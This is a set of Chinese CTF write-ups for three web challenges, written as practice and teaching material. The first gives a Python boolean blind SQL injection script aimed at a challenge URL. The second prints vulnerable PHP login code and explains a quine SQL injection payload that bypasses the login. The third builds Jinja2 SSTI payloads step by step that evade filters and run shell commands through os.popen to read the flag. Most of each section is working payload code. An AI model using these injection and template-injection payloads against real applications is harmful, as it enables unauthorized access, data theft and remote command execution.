# [CISCN 2019华北Day2]Web1
>知识点：bool盲注

随便输入几个发现有过滤
![alt text](image-1.png)
485长度的都是被过滤掉的
然后寻找注入点
![alt text](image-2.png)
![alt text](image-3.png)
发现是盲注
```bash
    利用()绕过空格过滤

    该payload最内层，mid表示从flag列的第一个字符开始截取长度为1的子字符串

    第二层ascii用于判断截取出来的子字符串的ascii码值是否为78（即N，flag格式为NSSCTF{}）

    若是，则页面回显id=1的页面
```
脚本:
```python
import requests #requests: 用于发送HTTP请求，目的是通过HTTP POST方法与目标网站交互。
import string #提供了一个包含所有可打印字符的字符串，用于生成可能的字符集。

def blind_injection(url):
	flag = ''
	strings = string.printable # 可打印字符集，包含字母、数字、标点符号等
	for num in range(1,60):#假设 flag 的长度不超过 60 个字符（num 表示字符位置）。
		for i in strings:#遍历所有可打印字符，尝试通过SQL查询来猜测对应位置的字符
			payload = '(select(ascii(mid(flag,{0},1))={1})from(flag))'.format(num,ord(i))
            #payload 是构造的SQL查询语句，使用 mid(flag,{0},1) 来获取 flag 在第 num 位置的字符。ascii(mid(flag,{0},1))={1} 是通过 ASCII 值来判断字符是否匹配。

{0} 是 num，即当前正在猜测的字符位置；{1} 是 ord(i)，即字符 i 的ASCII值。

例如，当 num=1 和 i='A' 时，构造的SQL负载可能是：(select(ascii(mid(flag,1,1))=65)from(flag))，65 是字母 'A' 的ASCII值
			post_data = {"id":payload}
			res = requests.post(url=url,data=post_data)
			if 'Hello' in res.text:
				flag += i
				print(flag)
			else:
				continue
	print(flag)


if __name__ == '__main__':
	url = 'http://node4.anna.nssctf.cn:28911/index.php'
	blind_injection(url)

```
# [第五空间 2021]yet_another_mysql_injection

>qunine注入

后端代码
```php
<?php
include_once("lib.php");
function alertMes($mes,$url){
    die("<script>alert('{$mes}');location.href='{$url}';</script>");
}

function checkSql($s) {
    if(preg_match("/regexp|between|in|flag|=|>|<|and|\||right|left|reverse|update|extractvalue|floor|substr|&|;|\\\$|0x|sleep|\ /i",$s)){
        alertMes('hacker', 'index.php');
    }
}

if (isset($_POST['username']) && $_POST['username'] != '' && isset($_POST['password']) && $_POST['password'] != '') {
    $username=$_POST['username'];
    $password=$_POST['password'];
    if ($username !== 'admin') {
        alertMes('only admin can login', 'index.php');
    }
    checkSql($password);
    $sql="SELECT password FROM users WHERE username='admin' and password='$password';";
    $user_result=mysqli_query($con,$sql);
    $row = mysqli_fetch_array($user_result);
    if (!$row) {
        alertMes("something wrong",'index.php');
    }
    if ($row['password'] === $password) {
        die($FLAG);
    } else {
    alertMes("wrong password",'index.php');
  }
}

if(isset($_GET['source'])){
  show_source(__FILE__);
  die;
}
?>
<!-- /?source -->
<html>
    <body>
        <form action="/index.php" method="post">
            <input type="text" name="username" placeholder="账号"><br/>
            <input type="password" name="password" placeholder="密码"><br/>
            <input type="submit" / value="登录">
        </form>
    </body>
</html>
```
可以看到，用户只能是admin，而又要求输入的password要等于表中的password，而又过滤了很多东西，导致报错，盲注，联合，堆叠都不行
通过分析发现只有输入正确的密码才能得到FLAG，但是这张表其实是一张空表，所以爆破密码这条路走不通。
那就只有一个办法，就是构造一个输入输出完全一致的语句，就可以绕过限制并得到FLAG
大佬的payload
```bash
1'/**/union/**/select/**/replace(replace('1"/**/union/**/select/**/replace(replace(".",char(34),char(39)),char(46),".")#',char(34),char(39)),char(46),'1"/**/union/**/select/**/replace(replace(".",char(34),char(39)),char(46),".")#')#
```
1.首先先了解一下replace()函数

    replace(object,search,replace)
    把object对象中出现的的search全部替换成replace

看个例子

```bash
select replace(".",char(46),".");                 # char(46)就是.
+---------------------------+
| replace(".",char(46),".") |
+---------------------------+
| .                         |
+---------------------------+
```
发现
2.如何让输入输出一致呢？

上面的例子用.替换object里的.，最终返回了一个.，那如果我们将object写成replace(".",char(46),".")会有什么变化呢？
```bash
mysql> select replace(   'replace(".",char(46),".")'   ,   char(46)   ,   '.'   );
+---------------------------------------------------+
| replace('replace(".",char(46),".")',char(46),'.') |
+---------------------------------------------------+
| replace(".",char(46),".")                         |
+---------------------------------------------------+
```

 
结果返回了replace(".",char(46),".")这个东西，即object不变，但还是没有达到我们预期的效果怎么办，这时候我们将第三个参数也改成replace(".",char(46),".")
```bash
mysql> select replace('replace(".",char(46),".")',char(46),'replace(".",char(46),".")');
+---------------------------------------------------------------------------+
| replace('replace(".",char(46),".")',char(46),'replace(".",char(46),".")') |   #单引号
+---------------------------------------------------------------------------+
| replace("replace(".",char(46),".")",char(46),"replace(".",char(46),".")") |   #双引号
+---------------------------------------------------------------------------+
```

有点类似套娃的感觉。先分析一下这段sql语句

select replace('replace(".",char(46),".")',char(46),'replace(".",char(46),".")');

replace函数的三个参数分别是

'replace(".",char(46),".")'
char(46)
'replace(".",char(46),".")'

这个语句的意思是用第三个参数替换第一个参数里面的.并返回替换后的第一个参数

这样就明白了为什么返回的是replace("replace(".",char(46),".")",char(46),"replace(".",char(46),".")")


那么这样是否就达到了我们输入输出一致的目的呢，答案肯定是还没有。细心点就会发现输入与输出在单双引号上有细微的不同

3.解决单双引号不同的问题

有了上面的经验后，我们这样考虑，如果先将双引号替换成单引号是不是就可以解决引号不同的问题了。实现方法无非就是在套一层replace
```bash
mysql> select replace(replace('"."',char(34),char(39)),char(46),".");    # 先执行内层replace
+--------------------------------------------------------+
| replace(replace('"."',char(34),char(39)),char(46),".") |
+--------------------------------------------------------+
| '.'                                                    |
+--------------------------------------------------------+
1 row in set (0.00 sec)
```

这样就可以将我们的双引号替换成单引号，此时我们继续沿用上面的思路，构造输入输出相同的语句
```bash
mysql> select replace(

replace('replace(replace(".",char(34),char(39)),char(46),".")',char(34),char(39)),
char(46),
'replace(replace(".",char(34),char(39)),char(46),".")'

);
+------------------------------------------------------------------------------------------+
replace(replace('replace(replace(".",char(34),char(39)),char(46),".")',char(34),char(39)),char(46),'replace(replace(".",char(34),char(39)),char(46),".")') 
+------------------------------------------------------------------------------------------+
replace(replace('replace(replace(".",char(34),char(39)),char(46),".")',char(34),char(39)),char(46),'replace(replace(".",char(34),char(39)),char(46),".")') 
+------------------------------------------------------------------------------------------+
1 row in set (0.00 sec)
```
```
Quine基本形式：

replace(replace(‘str’,char(34),char(39)),char(46),‘str’)

先将str里的双引号替换成单引号，再用str替换str里的.

str基本形式（可以理解成上面的"."）

replace(replace(".",char(34),char(39)),char(46),".")

完整的Quine就是Quine基本形式+str基本形式
```


回过头来再看我们的payload

1'/**/union/**/select/**/replace(replace('',char(34),char(39)),char(46),'')#
可理解成我们的Quine的基本形式

1"/**/union/**/select/**/replace(replace(".",char(34),char(39)),char(46),".")#
这个就是我们str的基本形式

先将str里的双引号替换成单引号
1'/**/union/**/select/**/replace(replace('.',char(34),char(39)),char(46),'.')#
最终通过来回替换的形式达到了我们的目的

现在就明白了为什么我们的内层replace里面有一个单独的’’

Quine形式多变，修改的时候切记str对应也要修改

# [GDOUCTF 2023]<ez_ze>

>ssti

![alt text](image-4.png)
这个页面可以猜测是ssti,尝试{{7*7}}，结果被过滤了
可以通过这个语句来查询是否存在ssti
```bash
{%if 条件%}result{%endif%}
 
 
解释一下 如果条件里为真 就输出 result 否则不输出
 
修改一下
{%if not a%}yes{%endif%}
 
第二种
 
{%print 123%}
 
通过输出123来判断
```
![alt text](image-5.png)
然后我们首先确定一下我们需要的payload
```bash
(lipsum|attr("__globals__").get("os").popen("cat /flag").read()
```
这个时候我们需要获取_通过lipsum|string|list

这个时候可以通过 pop方法
 获取_
先需要获取pop

pop方法可以根据索引值来删除列中的某个元素并将该元素返回值返回。
```
{%set pop=dict(pop=a)|join%}
```
获得_
```
{%set one=dict(c=a)|join|count%}
{%set two=dict(cc=a)|join|count%}
{%set three=dict(ccc=a)|join|count%}
{%set four=dict(cccc=a)|join|count%}
{%set five=dict(ccccc=a)|join|count%}
{%set six=dict(cccccc=a)|join|count%}
{%set seven=dict(ccccccc=a)|join|count%}
{%set eight=dict(cccccccc=a)|join|count%}
{%set nine=dict(ccccccccc=a)|join|count%}
{%set pop=dict(pop=a)|join%}
{%set xiahuaxian=(lipsum|string|list)%}{%print xiahuaxian%}
 
然后我们数 可以发现 _ 在24 所以我们索引即可
 
{%set one=dict(c=a)|join|count%}
{%set two=dict(cc=a)|join|count%}
{%set three=dict(ccc=a)|join|count%}
{%set four=dict(cccc=a)|join|count%}
{%set five=dict(ccccc=a)|join|count%}
{%set six=dict(cccccc=a)|join|count%}
{%set seven=dict(ccccccc=a)|join|count%}
{%set eight=dict(cccccccc=a)|join|count%}
{%set nine=dict(ccccccccc=a)|join|count%}
{%set pop=dict(pop=a)|join%}
{%set xiahuaxian=(lipsum|string|list)|attr(pop)(three*eight)%}{%print xiahuaxian%}
```
![alt text](image-6.png)
然后获得glboals
```
name={%set one=dict(c=a)|join|count%}
{%set two=dict(cc=a)|join|count%}
{%set three=dict(ccc=a)|join|count%}
{%set four=dict(cccc=a)|join|count%}
{%set five=dict(ccccc=a)|join|count%}
{%set six=dict(cccccc=a)|join|count%}
{%set seven=dict(ccccccc=a)|join|count%}
{%set eight=dict(cccccccc=a)|join|count%}
{%set nine=dict(ccccccccc=a)|join|count%}
{%set pop=dict(pop=a)|join%}
{%set xiahuaxian=(lipsum|string|list)|attr(pop)(three*eight)%}
{%set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join%}
{%print globals%}
```
![alt text](image-7.png)
获取os
首先需要获取get
{%set get=dict(get=a)|join%}{%print get%}
![alt text](image-9.png)
然后
然后我们可以获取os
{%set shell=dict(o=a,s=b)|join%}{%print shell%}
![alt text](image-8.png)
![alt text](image-10.png)
被过滤了
```
{%set one=dict(c=a)|join|count%}
{%set two=dict(cc=a)|join|count%}
{%set three=dict(ccc=a)|join|count%}
{%set four=dict(cccc=a)|join|count%}
{%set five=dict(ccccc=a)|join|count%}
{%set six=dict(cccccc=a)|join|count%}
{%set seven=dict(ccccccc=a)|join|count%}
{%set eight=dict(cccccccc=a)|join|count%}
{%set nine=dict(ccccccccc=a)|join|count%}
{%set pop=dict(pop=a)|join%}
{%set xiahuaxian=(lipsum|string|list)|attr(pop)(three*eight)%}
{%set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join%}
{%set get=dict(get=a)|join%}
{%set shell=dict(o=a,s=b)|join%}
{%set pp=dict(po=a,pen=b)|join%}
{%print lipsum|attr(globals)|attr(get)(shell)|attr(pp)%}
```
获取chr
首先要获取__builtins__
```  
    {%set one=dict(c=a)|join|count%}
    {%set two=dict(cc=a)|join|count%}
    {%set three=dict(ccc=a)|join|count%}
    {%set four=dict(cccc=a)|join|count%}
    {%set five=dict(ccccc=a)|join|count%}
    {%set six=dict(cccccc=a)|join|count%}
    {%set seven=dict(ccccccc=a)|join|count%}
    {%set eight=dict(cccccccc=a)|join|count%}
    {%set nine=dict(ccccccccc=a)|join|count%}
    {%set pop=dict(pop=a)|join%}
    {%set xiahuaxian=(lipsum|string|list)|attr(pop)(three*eight)%}
    {%set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join%}
    {%set get=dict(get=a)|join%}
    {%set shell=dict(o=a,s=b)|join%}
    {%set pp=dict(po=a,pen=b)|join%}
    {%set builtins=(xiahuaxian,xiahuaxian,dict(builtins=a)|join,xiahuaxian,xiahuaxian)|join%}
    {%print builtins%}
```
获取chr

```     
    {%set one=dict(c=a)|join|count%}
    {%set two=dict(cc=a)|join|count%}
    {%set three=dict(ccc=a)|join|count%}
    {%set four=dict(cccc=a)|join|count%}
    {%set five=dict(ccccc=a)|join|count%}
    {%set six=dict(cccccc=a)|join|count%}
    {%set seven=dict(ccccccc=a)|join|count%}
    {%set eight=dict(cccccccc=a)|join|count%}
    {%set nine=dict(ccccccccc=a)|join|count%}
    {%set pop=dict(pop=a)|join%}
    {%set xiahuaxian=(lipsum|string|list)|attr(pop)(three*eight)%}
    {%set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join%}
    {%set get=dict(get=a)|join%}
    {%set shell=dict(o=a,s=b)|join%}
    {%set pp=dict(po=a,pen=b)|join%}
    {%set builtins=(xiahuaxian,xiahuaxian,dict(builtins=a)|join,xiahuaxian,xiahuaxian)|join%}
    {%set char=(lipsum|attr(globals))|attr(get)(builtins)|attr(get)(dict(chr=a)|join)%}
    {%print char%}


```

然后拼接获得命令
```

?name={%set one=dict(c=a)|join|count%}
{%set two=dict(cc=a)|join|count%}
{%set three=dict(ccc=a)|join|count%}
{%set four=dict(cccc=a)|join|count%}
{%set five=dict(ccccc=a)|join|count%}
{%set six=dict(cccccc=a)|join|count%}
{%set seven=dict(ccccccc=a)|join|count%}
{%set eight=dict(cccccccc=a)|join|count%}
{%set nine=dict(ccccccccc=a)|join|count%}
{%set pop=dict(pop=a)|join%}
{%set xiahuaxian=(lipsum|string|list)|attr(pop)(three*eight)%}
{%set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join%}
{%set%20get=dict(get=a)|join%}
{%set builtins=(xiahuaxian,xiahuaxian,dict(builtins=a)|join,xiahuaxian,xiahuaxian)|join%}
{%set char=(lipsum|attr(globals))|attr(get)(builtins)|attr(get)(dict(chr=a)|join)%}
{%set command=char(five*five*four-one)%2bchar(five*five*four-three)%2bchar(four*five*six-four)%2bchar(four*eight)%2bchar(six*eight-one)%2bchar(three*six*six-six)%2bchar(three*six*six)%2bchar(five*five*four-three)%2bchar(three*six*six-five)%}
{%print command%}
```
获取read
```
name={%set read=dict(read=a)|join%}{%print read%}
```
最后就是拼接执行命令
```
name={%set one=dict(c=a)|join|count%}
{%set two=dict(cc=a)|join|count%}
{%set three=dict(ccc=a)|join|count%}
{%set four=dict(cccc=a)|join|count%}
{%set five=dict(ccccc=a)|join|count%}
{%set six=dict(cccccc=a)|join|count%}
{%set seven=dict(ccccccc=a)|join|count%}
{%set eight=dict(cccccccc=a)|join|count%}
{%set nine=dict(ccccccccc=a)|join|count%}
{%set pop=dict(pop=a)|join%}
{%set xiahuaxian=(lipsum|string|list)|attr(pop)(three*eight)%}
{%set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join%}
{%set get=dict(get=a)|join%}
{%set shell=dict(o=a,s=b)|join%}
{%set pp=dict(po=a,pen=b)|join%}
{%set builtins=(xiahuaxian,xiahuaxian,dict(builtins=a)|join,xiahuaxian,xiahuaxian)|join%}
{%set char=(lipsum|attr(globals))|attr(get)(builtins)|attr(get)(dict(chr=a)|join)%}
{%set command=char(five*five*four-one)%2bchar(five*five*four-three)%2bchar(four*five*six-four)%2bchar(four*eight)%2bchar(six*eight-one)%2bchar(three*six*six-six)%2bchar(three*six*six)%2bchar(five*five*four-three)%2bchar(three*six*six-five)%}
{%set read=dict(read=a)|join%}{%print (lipsum|attr(globals))|attr(get)(shell)|attr(pp)(command)|attr(read)()%}
```
这是最麻烦的写法
正常的
```
{% set pop=dict(pop=1)|join %}   
 
{% set kong=(lipsum|string|list)|attr(pop)(9) %}
 
{% set xhx=(lipsum|string|list)|attr(pop)(18) %}
 
{% set re=(config|string|list)|attr(pop)(239) %}
 
{% set globals=(xhx,xhx,dict(globals=a)|join,xhx,xhx)|join %}
 
{% set geti=(xhx,xhx,dict(get=a,item=b)|join,xhx,xhx)|join %}
 
{% set o=dict(o=a,s=b)|join %}
 
{% set po=dict(pop=a,en=b)|join %}
 
{% set cmd=(dict(cat=a)|join,kong,re,dict(flag=a)|join)|join %}
 
{% set read=dict(read=a)|join %}
 
{% print(lipsum|attr(globals)|attr(geti)(o)|attr(po)(cmd)|attr(read)()) %}
 
这里原型是
 
lipsum.__globals__.getitem[os].popen(cat flag).read()
 
类似于这种
```